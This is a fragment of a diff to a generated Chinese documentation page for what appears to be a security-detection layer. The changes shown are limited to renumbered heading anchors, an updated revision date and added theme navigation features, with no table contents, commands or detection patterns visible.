 <tr>
@@ -4477,7 +4895,7 @@
 </tr>
 </tbody>
 </table>
-<h3 id="_3">外部内容安全<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h3 id="_5">外部内容安全<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -4499,7 +4917,7 @@
 </tr>
 </tbody>
 </table>
-<h3 id="_4">风险阈值与评分权重<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<h3 id="_6">风险阈值与评分权重<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <p>D1-D5 的短路规则在源码中硬编码，综合评分阈值和 D6 参数可通过以下变量调整：</p>
 <table>
 <thead>
@@ -4575,7 +4993,7 @@
 </tbody>
 </table>
 <hr />
-<h2 id="_5">相关页面<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<h2 id="_7">相关页面<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
 <ul>
 <li><a href="../l2-semantic/">L2 语义分析</a> — L1 升级到 L2 的条件与语义分析机制</li>
 <li><a href="../trajectory-analyzer/">轨迹分析器</a> — 跨事件的多步攻击序列检测（L1 之外的异步层）</li>
@@ -4604,7 +5022,7 @@
     <span class="md-icon" title="最后更新">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年4月30日 15:25:44 UTC">2026年4月30日</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="2026年5月19日 20:55:18 UTC">2026年5月19日</span>
   </span>
 
     
@@ -4727,11 +5145,13 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
     
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "toc.follow", "navigation.instant", "navigation.instant.progress", "navigation.path", "navigation.tracking", "navigation.indexes", "content.tooltips", "search.share"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
